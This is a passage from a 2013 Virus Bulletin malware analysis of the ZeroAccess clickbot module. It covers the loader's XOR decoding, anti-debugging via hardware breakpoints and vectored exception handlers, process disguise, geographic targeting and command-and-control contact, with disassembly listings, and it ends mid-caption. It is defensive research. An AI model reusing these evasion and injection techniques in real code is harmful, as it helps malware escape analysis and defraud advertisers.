<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: A deeper look into the ZeroAccess clickbot</title>
<meta name="description" content="Click fraud has been one of the biggest concerns for online advertisers for many years, and as researchers invest effort into developing pattern recognition and detection mechanisms to identify the fraudulent patterns, so the attackers tweak and evolve their click fraud methodologies. Wayne Low takes a look at the internal workings of the click fraud module of ZeroAccess." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1794;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201304-ZeroAccess"></a>A deeper look into the ZeroAccess clickbot</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2013-04-03</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Wayne Low</span></h3><span class="orgname">F-Secure</span>, <span class="orgdiv">Finland</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Click fraud has been one of the biggest concerns for online advertisers for many years, and as researchers invest effort into developing pattern recognition and detection mechanisms to identify the fraudulent patterns, so the attackers tweak and evolve their click fraud methodologies. Wayne Low takes a look at the internal workings of the click fraud module of ZeroAccess.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2013 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2831" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2831" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id4092432"></a></span></dt><dt><span class="sect1"><a href="#id3810411">Clickbot loader routine</a></span></dt><dt><span class="sect1"><a href="#id4625163">Yet another hardware breakpoint anti-debugging routine</a></span></dt><dt><span class="sect1"><a href="#id3639678">What is &lsquo;z00clicker3&rsquo;?</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id3358979">Blocking client access by regions</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id4883956">Communicating with the C&amp;C server</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id3373308">C&amp;C server IP addresses</a></span></dt><dt><span class="sect2"><a href="#id2162725">First contact with the C&amp;C server</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id4898509">Z00clicker&#39;s fraudulent click method</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id3619378">Sorting the raw TCP data</a></span></dt><dt><span class="sect2"><a href="#id2305446">The referrer and ad URLs</a></span></dt><dt><span class="sect2"><a href="#id3540382">Click fraud with a window-less browser</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id2628669">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4092432"></a></h2></div></div></div><p>Automated systems for clicking on advertisements that are displayed online for monetary gain &ndash; essentially, click fraud &ndash; has been one of the biggest concerns for online advertisers for many years. The major advertising networks, such as <span class="emphasis"><em>Google</em></span>&rsquo;s <span class="emphasis"><em>AdWords</em></span>/<span class="emphasis"><em>AdSense</em></span>, put significant effort into developing pattern recognition and detection mechanisms to identify the click patterns typically used by spammers and/or botnets engaging in click fraud.</p><p>To avoid being detected by such mechanisms, the methodology for click fraud used by botnets such as ZeroAccess (also known as clickbots) has been evolving steadily. While there are plenty of comprehensive analyses of ZeroAccess (e.g. [<span class="citation"><a href="#citation.1">1</a></span>]), there has been no detailed elaboration of how the ZeroAccess clickbot works internally &ndash; looking at its actions on the client machine and how it performs the click fraud operation.</p><p>The purpose of this article is to dissect the internal workings of ZeroAccess&rsquo;s click fraud module and to highlight the following details of the botnet&rsquo;s click fraud implementation:</p><div class="itemizedlist"><ul type="disc"><li><p>How it uses a &lsquo;traditional&rsquo; method to initialize socket functions for overlapped I/O operations, which allows simultaneous connections that can also serve as an anti debugging feature.</p></li><li><p>How it only targets specific countries, most likely because it is targeting country- or region-specific advertising networks.</p></li><li><p>How it includes functionality to randomize the clicks performed, preventing an unnaturally regular pattern that could alert suspicion from advertisers or the advertising networks.</p></li><li><p>How it uses a window-less browser to mimic legitimate clicks, making it appear as though the fraudulent clicks came from real users.</p></li></ul></div><p><span class="emphasis"><em>Note: The analysis that follows uses a click fraud sample (sha1: 223b257f1e810bf106819c0ec33387712a56e175) that was downloaded from the botnet in January 2013 and differs from samples examined in previous ZeroAccess-related papers. As such, some details mentioned here, such as the TCP port, will vary from previous reports.</em></span></p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3810411"></a>Clickbot loader routine</h2></div></div></div><p>The ZeroAccess malware can arrive on a client machine via many different routes, but it does so most commonly through a dropper that includes the malware as part of its payload. Once the dropper has successfully infected the machine, it downloads additional plug-in files &ndash; including the click fraud module, which has the file extension &lsquo;@&rsquo;.</p><p>This module acts as a loader for the click fraud binary, which is embedded immediately before the memcpy function. The binary is compressed as a <span class="emphasis"><em>Microsoft</em></span> Cabinet file and encoded using a simple rotate left XOR algorithm with the key 0x12345678:</p><pre class="programlisting">key = 0x12345678u;
do{
   *(DWORD*)szClickfraudCode ^= key;
   key = key &lt;&lt; 1;
   szClickfraudCode = (char *)szClickfraudCode + 4;
   --dwClickFraudCodeSize;
}while ( dwClickFraudCodeSize );
</pre><p>After the decoding operation, the binary will be decompressed using Cabinet API functions. The result of the decompression consists of a single binary file named noreloc.cod.</p><p>Noreloc.cod consists of a shellcode and an embedded DLL file (see <a href="#figure.1">Figure 1</a>). This binary file will be injected into the svchost.exe process job created by the plug-in module.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Decompressed embedded DLL module with shellcode." src="/uploads/images/figures/2013/04/ZeroAccess-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Decompressed embedded DLL module with shellcode.</b></p></div><p>(Click <a href="/uploads/images/figures/2013/04/ZeroAccess-1-large.jpg" target="_top">here</a> to view a larger version of Figure 1.)</p><p>In older ZeroAccess variants, the shellcode was only found in the malware dropper. In more recent variants, similar shellcode can also be found in the click fraud module. Whatever the location, in general, it serves two purposes:</p><div class="itemizedlist"><ul type="disc"><li><p>Deploying an anti-debugging feature</p></li><li><p>Loading an embedded MZ PE executable file.</p></li></ul></div><p>The shellcode will register a vectored exception handler (VEH) using RtlAddVectoredExceptionHandler. An exception must be triggered to invoke this exception handler. In order to achieve this, the shellcode sets a hardware breakpoint at debug register Dr3 through a context structure. This context is then set to the thread using ZwSetContextThread.</p><p>The purpose of VEH is to intercept ZwMapViewOfSection in order to impersonate a legitimate process running malicious code (see Listing 1). </p><pre class="programlisting">.text:0100392F /*
.text:0100392F Set DEBUG_REGISTER (Dr3) to ZwMapViewOfSection function addr
.text:0100392F */
.text:0100392F    xor  eax, eax
.text:01003931    lea  edi, [ebp+Context]
.text:01003937    mov  ecx, 0B3h
.text:0100393C    rep  stosd
.text:0100393E    mov  [ebp+Context.ContextFlags], CONTEXT_DEBUG_REGISTERS
.text:01003948    mov  [ebp+Context.Dr7], 40h ; L3 bit set =&gt; local breakpoint (dr3) enabled
.text:01003952    call GetZwMapViewOfSectionString
.text:01003957    push eax ; eax = &ldquo;ZwMapViewOfSection&rdquo;
.text:01003958    call _GetFunctionAddrByName
.text:0100395D    mov  [ebp+Context.Dr3], eax ; eax = Function address of ZwMapViewOfSection
.text:01003963    lea  eax, [ebp+Context]
.text:01003969    push eax
.text:0100396A    push 0FFFFFFFEh
.text:0100396C    call _CallZwSetContextThread
.text:01003971    pop  ecx
.text:01003972    pop  ecx
.text:01003973    call _GetSmssExeString
.text:01003978    push 10h
.text:0100397A    mov  esi, eax
.text:0100397C    pop  eax
.text:0100397D    call _StackspaceAlloc_0
.text:01003982    lea  eax, [ebp+usSmss]
.text:01003985    push esi
.text:01003986    push eax
.text:01003987    call _CallRtlInitUnicodeString
.text:0100398C    lea  eax, [ebp+SmssAddrSpace]
.text:0100398F    push eax
.text:01003990    lea  eax, [ebp+usSmss]
.text:01003993    push eax
.text:01003994    xor  esi, esi
.text:01003996    push esi
.text:01003997    push esi
.text:01003998    call _CallLdrLoadDll
.text:0100399D    mov  edi, eax
.text:0100399F    lea  eax, [ebp+Context]

<span class="bold"><strong>Listing 1: Code that intercepts ZwMapViewOfSection.</strong></span></pre><p>LdrLoadDll has a function prototype as follows:</p><pre class="programlisting">NTSTATUS NTAPI LdrLoadDll(
   IN PWSTR DllPath OPTIONAL,
   IN PULONG DllCharacteristics OPTIONAL,
   IN PUNICODE_STRING DllName,
   OUT PVOID *DllHandle
   );
</pre><p>When the shellcode executes the function LdrLoadDll with &lsquo;smss.exe&rsquo; (Session Manager Subsystem) as the DllName, the hardware breakpoint on ZwMapViewOfSection will be hit. The reason the breakpoint is hit can be seen in the following call stack: </p><pre class="programlisting">0007cc08 7c91c3da 0000006c ffffffff 0007cce0 ntdll!ZwMapViewOfSection
0007ccfc 7c916071 00000000 0007cd88 00000000 ntdll!LdrpMapDll+0x330
0007cfbc 7c9162da 00000000 00000000 00000000 ntdll!LdrpLoadDll+0x1e9
0007d264 00090314 00000000 00000000 0007d618 ntdll!LdrLoadDll+0x230
WARNING: Frame IP not in any known module. Following frames may be wrong.
0007d650 0009046f 00090688 0007ffa4 7c900000 0x90314
0007ffc0 7c816fd7 00000000 00000000 00000000 0x9046f
0007fff0 00000000 00090000 00000000 78746341 kernel32!BaseProcessStart+0x23
</pre><p>If there is a debugger present and it handles the exception, no VEH will be triggered &ndash; ZwMapViewOfSection will continue execution and eventually, LdrLoadDll will return the original value of smss.exe in DllHandle. If a debugger is present, VEH will take over ZwMapViewOfSection&rsquo;s execution flow and return the attacker&rsquo;s desired DllHandle value to shellcode. This value holds the click fraud code and will be executed at the end of the shellcode.</p><p>After the shellcode has accomplished its task, it will load and pass execution control to smss.exe, as shown in a process environment block (PEB) of svchost.exe (Listing 2).</p><pre class="programlisting">kd&gt; !peb
PEB at 7ffde000
  InheritedAddressSpace:    No
  ReadImageFileExecOptions: No
  BeingDebugged:            No
  ImageBaseAddress:         01000000
  Ldr                       001a1e90
  Ldr.Initialized:          Yes
  Ldr.InInitializationOrderModuleList: 001a1f28 . 001a35e0
  Ldr.InLoadOrderModuleList:           001a1ec0 . 001a35d0
  Ldr.InMemoryOrderModuleList:         001a1ec8 . 001a35d8
       Base  TimeStamp                      Module
    1000000  41107ed6 Aug 04 14:14:46 2004 C:\WINDOWS\system32\svchost.exe
    7c900000 411096b4 Aug 04 15:56:36 2004 C:\WINDOWS\system32\ntdll.dll
    7c800000 46239bd5 Apr 16 23:52:53 2007 C:\WINDOWS\system32\kernel32.dll
    77dd0000 411096a7 Aug 04 15:56:23 2004 C:\WINDOWS\system32\ADVAPI32.dll
    77e70000 46923520 Jul 09 21:16:16 2007 C:\WINDOWS\system32\RPCRT4.dll
    5cb70000 411096ba Aug 04 15:56:42 2004 C:\WINDOWS\system32\ShimEng.dll
    6f880000 4110968e Aug 04 15:55:58 2004 C:\WINDOWS\AppPatch\AcGenral.DLL
    7e410000 45f02d7c Mar 08 23:36:28 2007 C:\WINDOWS\system32\USER32.dll
    77f10000 47bbcdd9 Feb 20 14:51:05 2008 C:\WINDOWS\system32\GDI32.dll
    76b40000 411096d6 Aug 04 15:57:10 2004 C:\WINDOWS\system32\WINMM.dll
    774e0000 42e5be93 Jul 26 12:39:47 2005 C:\WINDOWS\system32\ole32.dll
    77c10000 41109752 Aug 04 15:59:14 2004 C:\WINDOWS\system32\msvcrt.dll
    77120000 47559e94 Dec 05 02:38:12 2007 C:\WINDOWS\system32\OLEAUT32.dll
    77be0000 411096cf Aug 04 15:57:03 2004 C:\WINDOWS\system32\MSACM32.dll
    77c00000 411096b7 Aug 04 15:56:39 2004 C:\WINDOWS\system32\VERSION.dll
    7c9c0000 47216027 Oct 26 11:33:59 2007 C:\WINDOWS\system32\SHELL32.dll
    77f60000 45091361 Sep 14 16:31:29 2006 C:\WINDOWS\system32\SHLWAPI.dll
    769c0000 411096b9 Aug 04 15:56:41 2004 C:\WINDOWS\system32\USERENV.dll
    5ad70000 411096bb Aug 04 15:56:43 2004 C:\WINDOWS\system32\UxTheme.dll
    76390000 411096ae Aug 04 15:56:30 2004 C:\WINDOWS\system32\IMM32.DLL
    629c0000 411096aa Aug 04 15:56:26 2004 C:\WINDOWS\system32\LPK.DLL
    74d90000 411096ba Aug 04 15:56:42 2004 C:\WINDOWS\system32\USP10.dll
    773d0000 44ef1b33 Aug 25 23:45:55 2006 C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.2982_x-ww_ac3f9c03\comctl32.dll
    5d090000 44ef1b36 Aug 25 23:45:58 2006 C:\WINDOWS\system32\comctl32.dll
    6b0000   505ebd88 Sep 23 15:43:04 2012 C:\WINDOWS\system32\smss.exe
    71ab0000 411096f2 Aug 04 15:57:38 2004 C:\WINDOWS\system32\WS2_32.dll
    71aa0000 411096f3 Aug 04 15:57:39 2004 C:\WINDOWS\system32\WS2HELP.dll
    78130000 480eb81c Apr 23 12:16:28 2008 C:\WINDOWS\system32\urlmon.dll
    78000000 480eb822 Apr 23 12:16:34 2008 C:\WINDOWS\system32\iertutil.dll
    72d20000 411096c6 Aug 04 15:56:54 2004 C:\WINDOWS\system32\wdmaud.drv
    71a50000 41109758 Aug 04 15:59:20 2004 C:\WINDOWS\system32\mswsock.dll
    ffd0000  40eb5d28 Jul 07 10:17:12 2004 C:\WINDOWS\system32\rsaenh.dll
    435d0000 480eb81d Apr 23 12:16:29 2008 C:\WINDOWS\system32\mshtml.dll
    746c0000 45516526 Nov 08 13:03:34 2006 C:\WINDOWS\system32\msls31.dll
    76bf0000 411096ca Aug 04 15:56:58 2004 C:\WINDOWS\system32\PSAPI.DLL
    662b0000 411096a0 Aug 04 15:56:16 2004 C:\WINDOWS\system32\hnetcfg.dll
    71a90000 411096fd Aug 04 15:57:49 2004 C:\WINDOWS\System32\wshtcpip.dll
  SubSystemData:     00000000
  ProcessHeap:       000a0000
  ProcessParameters: 00020000
  CurrentDirectory:  &lsquo;C:\WINDOWS\system32\&rsquo;
  WindowTitle:       &lsquo;C:\WINDOWS\system32\svchost.exe&rsquo;
  ImageFile:         &lsquo;C:\WINDOWS\system32\svchost.exe&rsquo;
  CommandLine:       &lsquo;\\.\globalroot\systemroot\Installer\{5e0dd525-1703-4a82-4e5e-73ea03452de4}\U&rsquo;


<span class="bold"><strong>Listing 2: Smss.exe loaded in svchost.exe by shellcode.</strong></span></pre><p>The PEB result shows that the malware has successfully disguised the Session Manager Subsystem running the click fraud code; indeed the PEB output raises the following questions:</p><div class="itemizedlist"><ul type="disc"><li><p>Why is a process address space allowed to contain two executable images?</p></li><li><p>Shouldn&rsquo;t only one instance of smss.exe be running as an independent process?</p></li></ul></div><p>On the other hand, these occurrences could be used as indicators that the machine has been infected.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4625163"></a>Yet another hardware breakpoint anti-debugging routine</h2></div></div></div><p>Once the click fraud routine has gained execution control, we immediately see another anti-debugging routine similar to the previous one; this routine, however, is slightly more straightforward. Again, it sets a hardware breakpoint at debug register Dr3, pointing to the WSPStartup function address (see Listing 3).</p><pre class="programlisting">.text:10002F8F  push  offset aWspstartup ; &ldquo;WSPStartup&rdquo;
.text:10002F94  push  offset aSystem32Mswsoc ; &ldquo;system32\\mswsock.dll&rdquo;
.text:10002F99  call  ds:LoadLibraryW
.text:10002F9F  push  eax  ; hModule
.text:10002FA0  call  ds:GetProcAddress
.text:10002FA6  mov   edi, eax
.text:10002FA8  test  edi, edi
.text:10002FAA  jz    loc_1000303B
.text:10002FB0  push  offset _VEHExecWSPSendRecvFunc
.text:10002FB5  push  1
.text:10002FB7  call  ds:RtlAddVectoredExceptionHandler
.text:10002FBD  mov   ebx, eax
.text:10002FBF  test  ebx, ebx
.text:10002FC1  jz    short loc_1000303B
.text:10002FC3  push  2CCh  ; Size
.text:10002FC8  lea   eax, [ebp+Context]
.text:10002FCE  push  0  ; Val
.text:10002FD0  push  eax  ; Dst
.text:10002FD1  call  memset
.text:10002FD6  add   esp, 0Ch
.text:10002FD9  lea   eax, [ebp+Context]
.text:10002FDF /*
.text:10002FDF Set DEBUG_REGISTER (Dr3) to WSPStartup function addr
.text:10002FDF */
.text:10002FDF  push  eax  ; Context
.text:10002FE0  push  0FFFFFFFEh  ; ThreadHandle
.text:10002FE2  mov   [ebp+Context.ContextFlags], CONTEXT_DEBUG_REGISTERS
.text:10002FEC  mov   [ebp+Context.Dr7], 40h ; L3 bit set =&gt; local breakpoint (dr3) enabled
.text:10002FF6  mov   [ebp+Context.Dr3], edi ; edi = WSPStartup
.text:10002FFC  call  ds:ZwSetContextThread
.text:10003002  lea   eax, [ebp+WSAData]
.text:10003008  push  eax  ; lpWSAData
.text:10003009  push  202h  ; wVersionRequested
.text:1000300E  call  ds:WSAStartup
.text:10003014  test  eax, eax
.text:10003016  jnz   short loc_10003034
.text:10003018  push  WSA_FLAG_OVERLAPPED ; dwFlags
.text:1000301A  push  eax  ; g
.text:1000301B  push  eax  ; lpProtocolInfo
.text:1000301C  push  IPPROTO_TCP  ; protocol
.text:1000301E  push  SOCK_STREAM  ; type
.text:10003020  push  AF_INET      ; af
.text:10003022  call  ds:WSASocketW  ; Triggered hardware breakpoint here
.text:10003028  cmp   eax, 0FFFFFFFFh
.text:1000302B  jz    short loc_10003034
.text:1000302D  push  eax   ; s
.text:1000302E  call  ds:closesocket


<span class="bold"><strong>Listing 3: Code that sets up second anti-debugging hook.</strong></span></pre><p>Upon calling WSASocketW, a breakpoint exception will be triggered due to the previously set hardware breakpoint. If there is no debugger attached, the malware has the chance to handle the exception and execute its assigned code. Otherwise, the debugger will stop the program execution at the WSPStartup function, as shown in <a href="#figure.2">Figure 2</a>. (<a href="#figure.2">Figure 2</a> also shows the call stack for WSASocketW.)</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Call stack for WSASocket." src="/uploads/images/figures/2013/04/ZeroAccess-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Call stack for WSASocket.</b></p></div><p>The intention of the exception handler is to initialize <span class="emphasis"><em>Windows</em></span> socket callback functions. These callback functions are responsible for pre-processing the network data (for example, the data sent to the C&amp;C server) and post-processing the data received from the server.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3639678"></a>What is &lsquo;z00clicker3&rsquo;?</h2></div></div></div><p>ZeroAccess&rsquo;s clickbot is a multi-threaded DLL module that performs monetizing clicks. The main thread holds the major codes that generate huge numbers of clicks at regular intervals. It includes the following functionalities:</p><div class="itemizedlist"><ul type="disc"><li><p>Determines whether the clients originate from specific geographic locations</p></li><li><p>Retrieves click fraud URLs from the C&amp;C server</p></li><li><p>Executes click fraud based on the URLs retrieved from the C&amp;C server</p></li><li><p>Sends click results to another remote server.</p></li></ul></div><p>In order to carry out its click fraud routine effectively, the module registers a class named &lsquo;z00clicker3&rsquo;, which acts as a core function in the whole click fraud operation. The main thread interacts closely with z00clicker by sending messages to it. For instance, when the main thread successfully receives ad URLs from the C&amp;C server, it sends a message to tell z00clicker to carry out the click fraud routine. The main thread is run in a loop that will be terminated under certain conditions.</p><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3358979"></a>Blocking client access by regions</h3></div></div></div><p>One of the routines found in the main thread indicates that z00clicker only targets certain countries and is capable of locating a victim&rsquo;s geographic location. The initial country code and time stamp of the malware&rsquo;s installation date are stored by another plug in DLL, <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="744c444444444444445a34">[email&#160;protected]</a>, in the Extended Attribute (EA) of z00clicker&rsquo;s root directory:</p><p>\\.\globalroot\systemroot\Installer\{5e0dd525-1703-4a82-4e5e-73ea03452de4}\U</p><p>The country code is retrieved from a third-party GeoIP location service provider every time the thread is executed. If the installation date is older than one day, the country code will be renewed. The renewal country code and current date will be saved to the EA of the U directory again.</p><p>After the country code is determined, it is compared against the predefined string &lsquo;USGBAUCADEINESFRITSGMYNLSE&rsquo;, which appears to be a list of country codes. The click fraud operations appear to be targeting online advertising networks that are highly specific to these countries.</p><div class="table"><a id="table.1"></a><table border="1" summary="Country codes."><colgroup><col /><col /></colgroup><thead><tr><th align="center">Country code</th><th align="center">Country name</th></tr></thead><tbody><tr><td>US</td><td>United States</td></tr><tr><td>GB</td><td>Great Britain</td></tr><tr><td>AU</td><td>Australia</td></tr><tr><td>CA</td><td>Canada</td></tr><tr><td>DE</td><td>Germany</td></tr><tr><td>IN</td><td>India</td></tr><tr><td>ES</td><td>Spain</td></tr><tr><td>FR</td><td>France</td></tr><tr><td>IT</td><td>Italy</td></tr><tr><td>SG</td><td>Singapore</td></tr><tr><td>MY</td><td>Malaysia</td></tr><tr><td>NL</td><td>Netherlands</td></tr><tr><td>SE</td><td>Sweden</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Country codes.</b></p></div><p>The predefined string also indicates that IP addresses from those countries are permitted to contact the C&amp;C server. If it is determined that the victim&rsquo;s system resides in a country outside of this list, the main thread will be aborted and no click fraud operation will be carried out.</p><p>In fact, it appears that even if researchers manage to forge the country code by using proxy servers, the main thread will not perform its click fraud operation as the C&amp;C server refuses to respond to any queries sent from the client. Clearly, the remote server has another layer of integrity checking to ensure that only actual infected clients in the targeted countries can perform the click fraud operation.</p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4883956"></a>Communicating with the C&amp;C server</h2></div></div></div><p>Assuming the request from the victim machine is accepted, the response from the C&amp;C server consists of URLs needed to perform the click fraud. An overview of how the clickbot performs this is shown in <a href="#figure.3">Figure 3</a>.</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="The click fraud operation." src="/uploads/images/figures/2013/04/ZeroAccess-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;The click fraud operation.</b></p></div><p>Before any of this can happen, however, the click fraud module on the infected machine has to find and communicate with one of the C&amp;C servers.</p><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3373308"></a>C&amp;C server IP addresses</h3></div></div></div><p>The C&amp;C server&rsquo;s IP addresses are encoded and stored in the third IMAGE_RESOURCE_DATA_ENTRY in the resource section of the <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9aaaaaaaaaaaaaaaabb4da">[email&#160;protected]</a> plug-in DLL file saved in the U directory (<a href="#figure.4">Figure 4</a>). These IP addresses are decoded using a simple XOR algorithm with the key 0x2CB7F6D5.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Encoded C&amp;C server IP addresses." src="/uploads/images/figures/2013/04/ZeroAccess-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Encoded C&amp;C server IP addresses.</b></p></div><p>An IP address is chosen randomly from the pool of addresses and stored in a global variable that will be used later in the click fraud operation.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2162725"></a>First contact with the C&amp;C server</h3></div></div></div><p>The first step of the click fraud operation is to send the victim system&rsquo;s information, retrieved from the Windows native API ZwQuerySystemInformation, to a C&amp;C server on TCP port 12757. Each C&amp;C IP address obtained from the resource section is attempted until a TCP response is received from the server (see <a href="#figure.5">Figure 5</a>).</p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Encoded (top) and decoded (bottom) TCP response." src="/uploads/images/figures/2013/04/ZeroAccess-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Encoded (top) and decoded (bottom) 